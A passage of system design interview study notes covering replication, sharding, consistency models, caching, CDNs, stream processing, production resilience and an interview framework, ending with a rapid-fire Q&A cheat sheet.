**Primary–Replica (leader–follower) replication**

```
                    ┌──────────────┐
   writes ─────────►│   PRIMARY    │
                    │  (leader)    │
                    └──────┬───────┘
                           │ replication stream (WAL / binlog)
             ┌─────────────┼─────────────┐
             ▼             ▼             ▼
      ┌───────────┐ ┌───────────┐ ┌───────────┐
      │ Replica 1 │ │ Replica 2 │ │ Replica 3 │ ◄──── reads
      └───────────┘ └───────────┘ └───────────┘
```

| Benefit | How |
|---|---|
| **Read scaling** | Most apps are read-heavy (often 10:1 or 100:1). Fan reads out across replicas. |
| **No more SPOF** | Primary dies → **promote a replica** to primary (failover). |
| **Backups without impact** | Take backups off a replica, not the primary. |
| **Geo-latency** | Put replicas near users for local reads. |

**Sync vs async replication**

| Mode | Guarantee | Cost |
|---|---|---|
| **Synchronous** | Commit only after replica confirms → **no data loss** | Slower writes; a slow replica stalls the primary |
| **Asynchronous** ⭐ common | Commit immediately, replicate in background | Fast, but **replication lag** → recent writes can be lost on failover |
| **Semi-synchronous** | Wait for *at least one* replica | Balanced — the usual production choice |

**⚠️ Replication lag — the classic interview trap**

```
1. User posts a comment          → writes to PRIMARY
2. Page reloads, reads a REPLICA → replica hasn't caught up
3. User's own comment is MISSING → "did my post fail?"
```
This is the **read-your-own-writes** problem. Fixes:
- **Read-your-writes routing** — after a write, pin that user's reads to the primary for N seconds.
- **Monotonic reads** — pin a user to one replica so time never appears to go backwards.
- Read from the primary for critical paths only (checkout, balance).

**Other replication topologies**

| Topology | Use | Watch out for |
|---|---|---|
| **Multi-primary (multi-leader)** | Multi-region writes, offline-capable clients | **Write conflicts** → need LWW, CRDTs, or app-level merge |
| **Leaderless (Dynamo-style)** | Cassandra, DynamoDB, Riak | **Quorums**: `W + R > N` gives strong-ish consistency |

**Failover mechanics:** health checks detect a dead primary → **leader election** (Raft/Paxos, or Redis Sentinel / Patroni / Orchestrator) → promote replica → repoint clients via DNS or a proxy (ProxySQL, PgBouncer).
⚠️ **Split-brain** — two nodes both think they're primary. Prevent with **quorum** (a majority must agree) and **fencing/STONITH**.

### 15.2 Sharding (horizontal partitioning)

Replication scales **reads**. It does **not** scale writes or storage — every node still holds the full dataset. For that you **shard**: split the data across independent databases.

```
                  ┌── shard router / app logic ──┐
                  ▼              ▼                ▼
            ┌──────────┐   ┌──────────┐    ┌──────────┐
            │ Shard 1  │   │ Shard 2  │    │ Shard 3  │
            │ users    │   │ users    │    │ users    │
            │ A–H      │   │ I–P      │    │ Q–Z      │
            └──────────┘   └──────────┘    └──────────┘
```

| Strategy | How the shard key maps | ✅ Pros | ❌ Cons |
|---|---|---|---|
| **Range-based** | `A–H`, `I–P`, `Q–Z`; or date ranges | Efficient **range scans** | **Hot spots** (everyone named "S", or today's date) |
| **Hash-based** | `hash(user_id) % N` | Even distribution | **Resharding remaps everything**; no range queries |
| **Consistent hashing** ⭐ | Hash ring (see §4.1) | Adding a node moves only **~1/N** of keys | More complex; needs virtual nodes |
| **Directory-based** | A lookup service maps key → shard | Maximum flexibility; easy rebalancing | The directory becomes a **SPOF** + extra hop |
| **Geo-based** | Shard by region | Low latency, **data residency / GDPR** | Uneven regional load |

**Choosing a shard key — the single most important decision.** A good key gives **high cardinality**, **even distribution**, and keeps **related data together** so most queries hit one shard.

**⚠️ The problems sharding creates**

| Problem | Explanation | Mitigation |
|---|---|---|
| **Cross-shard joins** | You can't `JOIN` across databases | Denormalise; join in the app; keep related data co-located |
| **Cross-shard transactions** | No single-DB ACID | **Saga pattern**, two-phase commit (slow), or design to avoid |
| **Hot shard / celebrity problem** ⭐ | One key gets disproportionate traffic (a celebrity's follower list) | Sub-shard that key; dedicated cache; read replicas for the hot shard |
| **Resharding** | Adding capacity remaps data | **Consistent hashing**; or over-provision **logical shards** (e.g. 1024) and move them between physical nodes |
| **Global uniqueness** | `AUTO_INCREMENT` collides across shards | **UUID**, **Snowflake IDs**, or a ticket server |
| **Operational pain** | Backups, migrations, schema changes × N | Automation, schema-change tooling |

### 15.3 Other data-tier scaling levers

| Technique | What it does |
|---|---|
| **Federation (functional partitioning)** | Split by *function*, not rows: `users_db`, `orders_db`, `products_db`. Simpler than sharding; a natural fit for microservices. |
| **Indexing** | The cheapest, highest-leverage fix. Know **B-tree** (range queries) vs **hash** (equality) vs **composite** (order matters!) vs **covering** indexes. Cost: slower writes + storage. |
| **Denormalisation** | Duplicate data to avoid joins. Trades write complexity + consistency for read speed. |
| **Materialised views** | Precomputed query results, refreshed periodically. Great for dashboards/aggregates. |
| **Connection pooling** | DB connections are expensive; pool them (PgBouncer, HikariCP). Prevents connection exhaustion under load. |
| **Read/write splitting** | Route `SELECT` to replicas, `INSERT/UPDATE/DELETE` to the primary. |
| **CQRS** | Separate the write model from the read model entirely, each optimised for its job. |

### 15.4 ⭐ CAP, PACELC and consistency models

**CAP theorem:** during a network **P**artition you must choose between **C**onsistency and **A**vailability. (Partitions are not optional — networks fail — so it's really CP vs AP.)

| | Choice | Behaviour during a partition | Examples |
|---|---|---|---|
| **CP** | Consistency | Reject requests rather than serve stale data | Postgres/MySQL with sync replication, MongoDB, HBase, ZooKeeper, etcd |
| **AP** | Availability | Keep serving, possibly stale; reconcile later | Cassandra, DynamoDB, Riak, CouchDB |

**PACELC** (the more complete rule): *if* **P**artition → **A** or **C**; **E**lse (normal operation) → **L**atency or **C**onsistency. Even with no partition, you trade latency for consistency.

**Consistency models, strongest → weakest**

| Model | Meaning |
|---|---|
| **Strict / linearizable** | Every read sees the most recent write, globally. Expensive. |
| **Sequential** | All nodes see operations in the same order. |
| **Causal** | Causally related operations are seen in order (reply after original comment). |
| **Read-your-writes** | You always see your own writes. |
| **Eventual** ⭐ | Given no new writes, all replicas *eventually* converge. The NoSQL default. |

**BASE** (the NoSQL counterpart to ACID): **B**asically **A**vailable, **S**oft state, **E**ventually consistent.

---

## 16. Caching

> Detailed notes already exist in [cache.md](cache.md). This is the interview-compressed version, tied into this course's architecture.

**Why cache:** cut **latency** (RAM is 10×–1000× faster than disk/DB/network), cut **load** on the origin, cut **cost**, raise **throughput**, and even raise **availability** (serve stale data when the origin is down).
**The one trade-off:** a cache is duplicate data → **staleness**. All cache design is *freshness vs performance*.

### 16.1 Cache layers along the request path

```
Client ──► DNS ──► CDN ──► Load Balancer ──► API Gateway ──► App Server ──► DB
   │        │       │           │                │                │          │
 Browser   DNS     Edge      Reverse-proxy   Gateway      In-process /    Buffer
  cache   cache   cache         cache         cache      Distributed      pool
                                                          (Redis)
```

| Layer | Notes |
|---|---|
| **Browser** | Fastest possible — zero network hops. Driven by `Cache-Control`, `ETag`, `Expires`, `Last-Modified`. |
| **DNS** | Domain → IP, governed by record **TTL**. (See [DNS.md](DNS.md).) |
| **CDN** | §17. |
| **Reverse proxy** | Nginx/Varnish caching whole HTTP responses — great for anonymous read-heavy traffic. |
| **API gateway** | Caches identical API calls, keyed by URL + method + headers. |
| **In-process** | Caffeine/Guava/`MemoryCache`. Fastest (no network) but **not shared across instances** and lost on restart. Best for tiny hot data: config, feature flags, lookup tables. |
| **Distributed** ⭐ | Redis/Memcached cluster. **Shared across all app instances** → consistent view. Sub-ms in-DC. Best for sessions, profiles, computed results, rate-limit counters. |
| **Database** | Buffer pool / page cache; materialised views. |

### 16.2 Read strategies

| Pattern | Flow | Trade-off |
|---|---|---|
| **Cache-aside (lazy loading)** ⭐ most common | App checks cache → miss → read DB → write cache → return | Simple; only requested data cached; **survives cache outage**. But first request is slow, and the app owns the caching logic. |
| **Read-through** | App only ever talks to the cache; the cache library loads from the DB on miss | Cleaner abstraction; DB access hidden. Needs library/provider support. |
| **Refresh-ahead** | Proactively refresh hot keys *before* they expire | Hides miss latency; wasted work if the prediction is wrong. |

### 16.3 Write strategies

| Pattern | Flow | Trade-off |
|---|---|---|
| **Write-through** | Write to cache **and** DB synchronously | Cache always consistent; **slower writes**; caches data that may never be read. |
| **Write-behind (write-back)** | Write to cache, flush to DB asynchronously | **Fastest writes**, absorbs spikes; **risk of data loss** if the cache dies before flush. |
| **Write-around** | Write straight to the DB, bypass the cache | Avoids polluting cache with write-once data; first read is a miss. |

### 16.4 Eviction policies

**LRU** (least recently used — the default) · **LFU** (least frequently used) · **FIFO** · **TTL** (time-based) · **Random**.

### 16.5 ⭐ The four cache failure modes (high-signal interview material)

| Failure | What happens | Fix |
|---|---|---|
| **Cache stampede / thundering herd** | A hot key expires; 10,000 concurrent requests all miss and hammer the DB at once | **Request coalescing / single-flight lock**, **jittered TTLs**, **probabilistic early expiration**, serve-stale-while-revalidate |
| **Cache penetration** | Requests for keys that **don't exist** always miss and always hit the DB (often malicious) | **Cache the negative result** (short TTL), **Bloom filter** in front |
| **Cache avalanche** | Many keys expire at the same moment (e.g. all set at deploy time) → mass miss | **Randomise/jitter TTLs**, staggered warm-up, multi-level cache |
| **Hot key** | One key gets so much traffic it saturates a single cache node | **Local L1 cache** in front of Redis, **replicate the key** across nodes with a suffix |

### 16.6 Invalidation — "one of the two hard things in CS"

| Method | Notes |
|---|---|
| **TTL / expiry** | Simplest, most common. Accepts bounded staleness. |
| **Explicit purge on write** | Accurate but easy to miss a code path. |
| **Write-through** | Cache is updated as part of the write. |
| **Versioned keys** | `user:123:v7` — never delete, just bump the version. No race conditions. |
| **Event-driven** | DB change stream / CDC publishes invalidations. |

---

## 17. CDN — Content Delivery Network

A **geographically distributed network of edge servers (PoPs)** that caches content close to users.

```
                 ┌── Edge: Mumbai ──┐
User (Mumbai) ──►│  cache HIT ✅    │──► response in ~10 ms
                 └──────────────────┘
                          │ cache MISS
                          ▼
                 ┌── Origin: us-east-1 ──┐   ~250 ms away
                 └───────────────────────┘
```

### 17.1 Why a CDN

| Benefit | Explanation |
|---|---|
| **Latency** | Content served from a PoP near the user instead of one distant origin |
| **Origin offload** | The vast majority of static traffic never reaches your servers → smaller fleet, lower bill |
| **Bandwidth cost** | CDN egress is far cheaper than cloud origin egress |
| **Availability** | The edge can serve cached/stale content when the origin is down |
| **DDoS absorption** | Attack traffic is soaked up by a globally distributed network |
| **TLS termination at the edge** | Shorter handshake RTT for users |

### 17.2 Push vs Pull

| | **Push CDN** | **Pull CDN** ⭐ common |
|---|---|---|
| How | You upload content to the CDN | Edge fetches from origin on the **first request (miss)**, then caches |
| Best for | Small, infrequently changing catalogues; large files | Sites with lots of traffic and frequently changing content |
| Cost | You manage what's stored | First user per PoP pays the miss penalty |

### 17.3 Key concepts

- **Cache key** — usually URL + query string (+ selected headers/cookies). *Adding cookies to the key can destroy your hit rate.*
- **TTL** — via `Cache-Control: max-age` / `s-maxage`.
- **`stale-while-revalidate`** — serve stale instantly while refreshing in the background.
- **Purge / invalidation** — by URL, by prefix, by **surrogate/cache tag**.
- **Cache busting** ⭐ — never purge JS/CSS; ship **content-hashed filenames** (`app.9f2c1a.js`) with a 1-year TTL. New build = new URL = new cache entry.
- **Origin shield** — a designated mid-tier PoP that absorbs misses from all other PoPs so the origin sees ~1 request instead of 200.
- **Dynamic content acceleration** — even uncacheable requests benefit from the CDN's optimised backbone routing + persistent origin connections.
- **Edge compute** — Cloudflare Workers, Lambda@Edge: run auth, A/B tests, redirects, personalisation at the PoP.

**What to cache:** images, JS/CSS, fonts, video segments, and increasingly whole HTML pages and API `GET` responses.
**What not to:** anything user-specific or auth-scoped — unless you deliberately **`Vary`** on the right header and are very careful.

Providers: **Cloudflare, Akamai, AWS CloudFront, Fastly, Google Cloud CDN, Azure CDN**.

---

## 18. Big Data Processing

> Roadmap module 5: *"how to handle large-scale data the right way."*

### 18.1 Batch vs Stream

| | **Batch** | **Stream (real-time)** |
|---|---|---|
| Data | Bounded — a finite chunk (yesterday's logs) | Unbounded — a continuous, infinite feed |
| Latency | Minutes to hours | Milliseconds to seconds |
| Use | Daily reports, ETL, ML training, billing runs | Fraud detection, live dashboards, alerting, personalisation |
| Tools | **Hadoop MapReduce**, **Apache Spark**, AWS Glue, dbt | **Kafka Streams**, **Apache Flink**, Spark Structured Streaming, Kinesis |

**MapReduce in one line:** **Map** (transform each record into key–value pairs, in parallel) → **Shuffle** (group by key) → **Reduce** (aggregate per key). Spark is the modern successor — in-memory, DAG-based, ~10–100× faster.

### 18.2 Architectures

| Architecture | Idea | Trade-off |
|---|---|---|
| **Lambda** | Run a **batch layer** (accurate, slow) *and* a **speed layer** (fast, approximate) in parallel; merge at query time | Accurate + fast, but you **maintain two codebases** for the same logic |
| **Kappa** ⭐ modern | **Stream only.** Reprocess history by replaying the log from the beginning | One codebase; requires a durable, replayable log (Kafka) |

### 18.3 Message queues & event streaming

The backbone of every large data system (extends §8.5 AMQP).

| | **Message queue** (RabbitMQ, SQS) | **Event log / stream** (Kafka, Kinesis, Pulsar) |
|---|---|---|
| Model | Message is **consumed and removed** | Messages are **retained**; each consumer tracks its own **offset** |
| Consumers | Typically one consumer per message | **Many independent consumers** replay the same data |
| Ordering | Per-queue | **Per-partition** |
| Throughput | High | **Very high** (millions/sec) |
| Best for | Task/work distribution, RPC-ish jobs | Event sourcing, analytics pipelines, CDC, fan-out |

**Delivery semantics** ⭐
| Guarantee | Meaning |
|---|---|
| **At-most-once** | May be lost, never duplicated |
| **At-least-once** ⭐ the practical default | Never lost, **may be duplicated** → consumers must be **idempotent** |
| **Exactly-once** | Ideal but expensive; usually achieved as at-least-once + **idempotency keys** or transactional writes |

**Other essentials:** **consumer groups** (parallelism), **partitioning** (order is only guaranteed within a partition — pick the partition key carefully), **dead-letter queues** (park poison messages), **backpressure**, **replay**.

### 18.4 Storage tiers

| Tier | What | Examples |
|---|---|---|
| **Data lake** | Raw, schema-on-read, cheap object storage | S3, ADLS, GCS + Parquet/ORC |
| **Data warehouse** | Cleaned, schema-on-write, optimised for analytics (columnar) | Snowflake, BigQuery, Redshift |
| **Lakehouse** | Warehouse semantics (ACID, time travel) on lake storage | Delta Lake, Apache Iceberg, Hudi |
| **OLTP vs OLAP** ⭐ | **OLTP** = many small transactions, row-oriented (Postgres). **OLAP** = few huge scans/aggregations, **column-oriented** (BigQuery, ClickHouse). |

### 18.5 Approximation algorithms (a favourite senior question)

When exact answers cost too much, trade precision for orders of magnitude less memory:

| Algorithm | Answers | Memory |
|---|---|---|
| **Bloom filter** | "Definitely not present" / "probably present" | Tiny; **no false negatives**, some false positives |
| **HyperLogLog** | Approximate **distinct count** (unique visitors) | ~12 KB for billions of items, ~2% error |
| **Count-Min Sketch** | Approximate **frequency** of an item | Sub-linear; used for heavy hitters / trending |
| **Reservoir sampling** | Uniform random sample from an unbounded stream | O(k) |
| **t-digest / HDRHistogram** | Approximate **percentiles** (p95/p99 latency) | Small, mergeable |

---

## 19. Designing for Production

> Roadmap module 6: *"systems that actually work in the real world, not just on your laptop."*

### 19.1 Observability — the three pillars

| Pillar | Question it answers | Tools |
|---|---|---|
| **Metrics** | *Is something wrong?* Numeric time series — RPS, latency, error rate, saturation | Prometheus, Grafana, Datadog, CloudWatch |
| **Logs** | *What exactly happened?* Discrete, structured events | ELK/OpenSearch, Loki, Splunk |
| **Traces** | *Where is the time going across services?* One request's full path | OpenTelemetry, Jaeger, Zipkin |

**What to actually alert on — the four golden signals:** **Latency**, **Traffic**, **Errors**, **Saturation**. (Or **RED**: Rate, Errors, Duration; **USE**: Utilisation, Saturation, Errors.)
⭐ **Alert on symptoms users feel, not on causes.** "p99 checkout latency > 2s" beats "CPU > 80%".

### 19.2 SLI / SLO / SLA + error budgets

| Term | Definition |
|---|---|
| **SLI** — Service Level *Indicator* | The **measurement**: "99.3% of requests succeeded in <300 ms" |
| **SLO** — Service Level *Objective* | Your internal **target**: "99.9% of requests < 300 ms" |
| **SLA** — Service Level *Agreement* | The **contract** with customers, with financial penalties. Always looser than the SLO. |
| **Error budget** ⭐ | `100% − SLO`. At 99.9% you may be "bad" for **43 min/month**. Budget left → ship features. Budget spent → **freeze features and fix reliability**. This is how SRE turns reliability into a number both eng and product accept. |

Availability "nines" (also in [latency.md](latency.md)): 99% ≈ 3.65 days/yr · 99.9% ≈ 8.8 h/yr · 99.99% ≈ 52.6 min/yr · 99.999% ≈ 5.3 min/yr.
`Availability = MTBF / (MTBF + MTTR)` — note you can improve availability by **recovering faster**, not just by failing less.

### 19.3 ⭐ Resilience patterns

| Pattern | Problem it solves |
|---|---|
| **Timeouts** | A hung downstream call holds your thread forever. **Every network call must have a timeout.** |
| **Retry with exponential backoff + jitter** | Transient failures. **Jitter is mandatory** — without it, all clients retry in lockstep and create a synchronised thundering herd. Only retry **idempotent** operations. |
| **Circuit breaker** | Stop hammering a service that's already down. States: **Closed** (normal) → **Open** (fail fast immediately) → **Half-Open** (trial requests) → Closed. Prevents **cascading failure**. |
| **Bulkhead** | Isolate resources (separate thread/connection pools per dependency) so one slow dependency can't consume every thread. |
| **Rate limiting / load shedding** | Reject excess traffic at the edge rather than collapsing under it. Shed low-priority work first. |
| **Graceful degradation** | Recommendations service down? Render the page without recommendations instead of a 500. |
| **Idempotency keys** ⭐ | Client sends `Idempotency-Key: <uuid>`; the server executes once and replays the stored response on retry. **Essential for payments.** |
| **Backpressure** | Signal upstream to slow down instead of buffering until you OOM. |
| **Fallback / cached response** | Serve last-known-good data when the source fails. |

### 19.4 Deployment strategies

| Strategy | How | Trade-off |
|---|---|---|
| **Rolling** | Replace instances a few at a time | No extra cost; both versions live simultaneously → needs backward compatibility |
| **Blue-green** | Two identical environments; flip the LB from blue to green | **Instant rollback**; costs 2× infrastructure |
| **Canary** ⭐ | Route 1% → 5% → 25% → 100%, watching metrics at each step | Smallest blast radius; needs solid automated metrics + auto-rollback |
| **Feature flags** | Deploy code dark, enable per-user/per-cohort at runtime | Decouples **deploy** from **release**; kill switch without redeploying. Cost: flag debt. |
| **Shadow / dark traffic** | Mirror real production traffic to the new version without serving its responses | Zero-risk load testing with real traffic patterns |

**Migrations rule:** database schema changes must be **backward compatible** (expand → migrate → contract), because during a rollout both versions run at once.

### 19.5 Scaling & infrastructure

- **Auto-scaling** on the right signal: CPU is a poor proxy; prefer **RPS**, **p99 latency**, or **queue depth**.
- **Stateless app tier** (§3.3) is the precondition for all of it.
- **Containers + orchestration** — Docker, Kubernetes (Deployments, HPA, liveness/readiness probes from §5).
- **Infrastructure as Code** — Terraform/Pulumi; no snowflake servers.
- **Multi-AZ → multi-region** — AZ redundancy is table stakes; multi-region active-active is expensive and raises data-consistency questions.
- **API gateway** responsibilities: routing, authN/authZ, rate limiting, request/response transformation, response aggregation, observability, versioning.
- **Service mesh** (Istio/Linkerd): mTLS, retries, circuit breaking and tracing pushed into the sidecar, out of your app code.

### 19.6 Operational maturity

- **Runbooks** for every alert — an alert with no documented action is noise.
- **On-call rotation** + escalation policy.
- **Blameless post-mortems** — fix systems, not people.
- **Chaos engineering** — deliberately inject failure (Chaos Monkey) to prove your redundancy actually works.
- **Load & soak testing** before launch; know your breaking point *before* your users find it.
- **Backups + tested restores** ⭐ — an untested backup is not a backup. Know your **RPO** (how much data you can lose) and **RTO** (how fast you must recover).

---

## 20. The System Design Interview — A Repeatable Framework

> Roadmap module 7. The course's core thesis (§0) is that seniors are paid for **architectural decisions and trade-offs**, and this is where you demonstrate that.

### 20.1 The 4-step structure (≈45 minutes)

**Step 1 — Requirements clarification (~5 min). Never skip this.**
- **Functional:** what must it do? Explicitly **scope out** what you won't build. (Mirrors §7.5: *define scope and boundaries*.)
- **Non-functional:** scale, latency targets, availability target, consistency needs, read/write ratio.
- **Constraints:** budget, team, existing stack, compliance/data residency.

**Step 2 — Back-of-the-envelope estimation (~5 min)**
```
100M DAU × 10 requests/day = 1B req/day
1B / 86,400 s               ≈ 11,600 RPS average
Peak ≈ 3× average           ≈ 35,000 RPS
Storage: 1B writes/day × 1 KB ≈ 1 TB/day ≈ 365 TB/yr (before replication)
```
Useful anchors: 1 day ≈ 86,400 s (~10⁵) · 1 M req/day ≈ 12 RPS · peak ≈ 2–3× average.
Latency ladder: L1 ~1 ns · RAM ~100 ns · SSD ~100 µs · disk ~10 ms · same-DC RTT ~0.5 ms · cross-continent RTT ~150 ms.

**Step 3 — High-level design (~15 min)**
Start with the **single-server box (§1)** and evolve it out loud:
```
Client → DNS → CDN → Load Balancer → App tier (stateless, N instances)
                                          ├→ Cache (Redis)
                                          ├→ Database (primary + replicas → shards)
                                          ├→ Message queue (async work)
                                          └→ Object storage (blobs)
```
Define the **API contract** (§7, §10) and the **data model** early — interviewers weight both heavily.

**Step 4 — Deep dive + bottlenecks (~15 min)**
Let the interviewer steer, or pick the interesting part yourself. Then **systematically walk the failure modes** — this is exactly §6:
> "What happens when *this* component dies?" Do it for the LB, app tier, cache, database, and region.

### 20.2 The scaling ladder — the same story every time

```
1. Single server                                    (§1)
2. Split web tier / data tier                       (§2)
3. Add a load balancer + multiple stateless servers (§3, §4)
4. Add a cache                                      (§16)
5. Add a CDN for static content                     (§17)
6. Replicate the database (read scaling + failover) (§15.1)
7. Add a message queue for async work               (§8.5, §18.3)
8. Shard the database                               (§15.2)
9. Split into microservices                         (§7.1)
10. Multi-region                                    (§4.1 geographic)
```
⭐ **Introduce each step only when you've named the bottleneck that forces it.** Jumping straight to "Kafka + Cassandra + Kubernetes" is the classic failure.

### 20.3 What you're actually scored on

| Signal | How to show it |
|---|---|
| **Requirement gathering** | Ask before designing. Confirm assumptions out loud. |
| **Trade-off reasoning** ⭐ | *"I'll use X over Y because ___, accepting ___ as the cost."* Never present a choice as free. |
| **Evolution under pressure** | Start simple, identify the bottleneck, scale that one thing. |
| **Failure thinking** | Proactively hunt SPOFs (§6) before being asked. |
| **Estimation** | Justify capacity with numbers, not vibes. |
| **Communication** | Think aloud, draw, check in: *"Does that direction work for you?"* |
| **Knowing what you don't know** | *"I haven't operated Cassandra at that scale; here's how I'd validate it."* — far stronger than bluffing. |

### 20.4 Common failure modes

❌ Designing before clarifying requirements
❌ Over-engineering for 1B users when the brief says 10K
❌ Naming technologies without justifying them
❌ Silence — the interviewer can only score what you say
❌ Ignoring the database bottleneck (it's almost always the answer)
❌ Forgetting non-functional requirements entirely
❌ Refusing to commit — *"it depends"* is only acceptable if you then **pick one and defend it**

### 20.5 Ready-made phrases

> *"Before I design anything, can I confirm the scale and the read/write ratio?"*
> *"Let me start with the simplest thing that works, then find where it breaks."*
> *"This database is now a single point of failure — let me add replication with automated failover."*
> *"I'm choosing eventual consistency here because the feed can tolerate a few seconds of staleness, and that buys me availability during a partition."*
> *"That's a trade-off: this cuts read latency but adds a staleness window. Given the requirements, I think it's the right call."*

---


## Rapid-Fire Interview Cheat Sheet

| Question | 10-second answer |
|---|---|
| SQL vs NoSQL? | SQL = relationships + **ACID** + complex joins. NoSQL = scale + flexible schema + low latency. Pick per workload; most systems are polyglot. |
| ACID? | Atomicity, Consistency, Isolation, Durability. |
| Vertical vs horizontal? | Bigger box (simple, capped, no redundancy) vs more boxes (unbounded, fault-tolerant, needs an LB + statelessness). |
| Name LB algorithms | Round robin, least connections, least response time, IP hash, weighted, geographic, **consistent hashing**. |
| Why consistent hashing? | Adding/removing a node remaps only ~1/N of keys instead of all of them — avoids a full cache invalidation storm. |
| How does an LB know a server is dead? | Periodic **health checks**; failing servers are pulled from rotation and re-added when they pass again. |
| What is a SPOF? Fix it? | Any component whose failure kills the whole system. Fix with **redundancy (N+1)**, health checks/monitoring, and **self-healing** replacement. |
| REST vs GraphQL vs gRPC? | REST = resources over HTTP verbs (web/mobile). GraphQL = one endpoint, client-shaped responses (complex UIs). gRPC = protobuf over HTTP/2 (microservices). |
| Idempotent methods? | GET, PUT, DELETE (and HEAD/OPTIONS). **POST is not.** PATCH usually isn't. |
| PUT vs PATCH? | PUT **replaces** the whole resource; PATCH **partially updates** it. |
| 401 vs 403? | 401 = not **authenticated**. 403 = authenticated but not **authorized**. |
| Status code for a successful POST? | **201 Created** (not 200). DELETE → **204 No Content**. |
| TCP vs UDP? | TCP: handshake, guaranteed, ordered, slower → payments/auth. UDP: no guarantees, faster → video/gaming/DNS. |
| Three-way handshake? | SYN → SYN-ACK → ACK. |
| Why WebSockets over polling? | Polling wastes bandwidth, server resources, and adds latency. WS = one persistent full-duplex connection; **the server can push**. |
| What is AMQP for? | Async messaging with guaranteed delivery via a broker + queues — decoupling, load levelling, retries. Exchange types: direct, fanout, topic. |
| Is JWT an auth method? | **No — it's a token format.** *Bearer* is the scheme; **OAuth 2 is an authorization framework**; **OIDC** is the authentication layer on top of it; **SSO** is a UX pattern. |
| Session vs JWT? | Sessions are **stateful** (server must remember; Redis in prod). JWT is **stateless** and self-contained — signature verified locally, no DB hit → scales horizontally. Trade-off: hard to revoke. |
| Where do you store the refresh token? | **`HttpOnly` (+ `Secure`, `SameSite`) cookie — never `localStorage`** — to block XSS theft. Then add CSRF protection. |
| OAuth 2 vs OIDC? | OAuth 2 = *what can this app access on my behalf* (access token). OIDC = adds **who I am** (**ID token**, a JWT). |
| SAML vs OIDC? | SAML = XML assertions, enterprise/legacy. OIDC = JSON/JWT, modern. Both underpin SSO. |
| RBAC vs ABAC vs ACL? | Roles (simple, GitHub) vs attributes+context (flexible, AWS IAM) vs per-resource permission list (granular, Google Drive). |
| Name API security techniques | Rate limiting, CORS, injection prevention (parameterized queries), WAF, VPN isolation, CSRF tokens, XSS sanitisation/CSP. |
| Why global rate limits *and* per-IP? | Per-IP alone can't stop a **botnet** where each bot stays under the limit; the aggregate ceiling catches it. |
| CSRF vs XSS? | CSRF = the attacker makes **your browser** send a forged authenticated request (fix: CSRF token + `SameSite`). XSS = the attacker runs **their script in another user's browser** (fix: sanitise, escape, CSP, `HttpOnly`). |
| Best API design rule? | **"The best API is one you can use without reading the documentation."** |

### Part II topics

| Question | 10-second answer |
|---|---|
| How do you remove the database SPOF? | **Primary–replica replication** + automated failover (promote a replica). Replicas also scale reads. |
| Replication lag problem? | **Read-your-own-writes** — a user posts, reads a stale replica, and their own write is missing. Fix: pin post-write reads to the primary, or use monotonic reads. |
| Replication vs sharding? | Replication copies the **whole** dataset (scales **reads** + gives redundancy). Sharding **splits** the dataset (scales **writes** + storage). |
| Sharding strategies? | Range, hash, **consistent hashing**, directory, geo. |
| What makes a good shard key? | High cardinality, even distribution, keeps related data co-located so queries hit one shard. |
| Biggest sharding pains? | Cross-shard **joins** and **transactions**, **hot/celebrity shards**, **resharding**, global unique IDs. |
| CAP theorem? | During a **partition** you pick **C** or **A**. CP = Postgres/MongoDB/etcd. AP = Cassandra/DynamoDB. |
| PACELC? | If **P**artition → A or C; **E**lse → **L**atency or **C**onsistency. Even with no partition you're trading. |
| BASE? | Basically Available, Soft state, Eventually consistent — the NoSQL counterpart to ACID. |
| Most common caching pattern? | **Cache-aside (lazy loading)** — check cache, on miss read DB and populate. |
| Write-through vs write-behind? | Write-through = cache + DB synchronously (consistent, slower). Write-behind = cache now, DB async (fast, **risk of loss**). |
| Cache stampede? Fix? | A hot key expires and thousands of requests hit the DB simultaneously. Fix: **single-flight lock**, **jittered TTLs**, probabilistic early expiry, serve-stale-while-revalidate. |
| Cache penetration vs avalanche? | Penetration = requests for keys that **never exist** (fix: cache negatives / Bloom filter). Avalanche = **many keys expire at once** (fix: jitter TTLs). |
| Push vs pull CDN? | Push = you upload. **Pull** = edge fetches from origin on first miss, then caches. Pull is the default. |
| How do you invalidate JS/CSS on a CDN? | Don't purge — use **content-hashed filenames** (`app.9f2c1a.js`) with a 1-year TTL. New build = new URL. |
| What is an origin shield? | A mid-tier PoP that absorbs misses from all other PoPs so the origin sees ~1 request instead of hundreds. |
| Lambda vs Kappa architecture? | Lambda = batch layer + speed layer (accurate but **two codebases**). **Kappa** = stream-only, replay the log to reprocess. |
| Message queue vs event log? | Queue (RabbitMQ/SQS): message consumed and **removed**. Log (Kafka): messages **retained**, each consumer has its own **offset** and can replay. |
| Delivery guarantees? | At-most-once · **at-least-once** (the practical default → consumers must be **idempotent**) · exactly-once (usually at-least-once + idempotency keys). |
| OLTP vs OLAP? | OLTP = many small transactions, **row**-oriented (Postgres). OLAP = few huge scans/aggregations, **column**-oriented (BigQuery, ClickHouse). |
| Name approximation algorithms. | **Bloom filter** (membership) · **HyperLogLog** (distinct count) · **Count-Min Sketch** (frequency) · reservoir sampling · t-digest (percentiles). |
| Three pillars of observability? | **Metrics** (is something wrong) · **Logs** (what happened) · **Traces** (where the time went). |
| Four golden signals? | **Latency, Traffic, Errors, Saturation.** Alert on symptoms users feel, not on CPU. |
| SLI vs SLO vs SLA? | SLI = the measurement. SLO = your internal target. SLA = the contract with penalties. |
| What is an error budget? | `100% − SLO`. At 99.9% you get ~43 min/month of "bad". Budget left → ship. Budget spent → **freeze and fix reliability**. |
| Explain the circuit breaker. | **Closed** → **Open** (fail fast, stop hammering a dead service) → **Half-Open** (trial requests) → Closed. Prevents cascading failure. |
| Why is jitter mandatory on retries? | Without it every client retries in lockstep, creating a synchronised thundering herd that re-kills the recovering service. |
| How do you make retries safe for payments? | **Idempotency keys** — the server executes once and replays the stored response on retry. |
| Canary vs blue-green? | Canary = shift 1%→5%→25%→100% watching metrics (smallest blast radius). Blue-green = two full environments, **instant rollback**, 2× cost. |
| Deploy vs release? | **Feature flags** decouple them — ship code dark, enable per cohort at runtime, kill switch without redeploying. |
| RPO vs RTO? | **RPO** = how much data you can afford to lose. **RTO** = how fast you must be back up. An untested backup is not a backup. |
| Structure of a system design interview? | 1) Clarify requirements → 2) Back-of-envelope estimation → 3) High-level design → 4) Deep dive + failure modes. |
| Peak RPS rule of thumb? | `DAU × req/user ÷ 86,400` for the average; **peak ≈ 2–3× average**. |
| Biggest interview mistake? | Designing before clarifying requirements, and naming technologies without justifying the trade-off. |
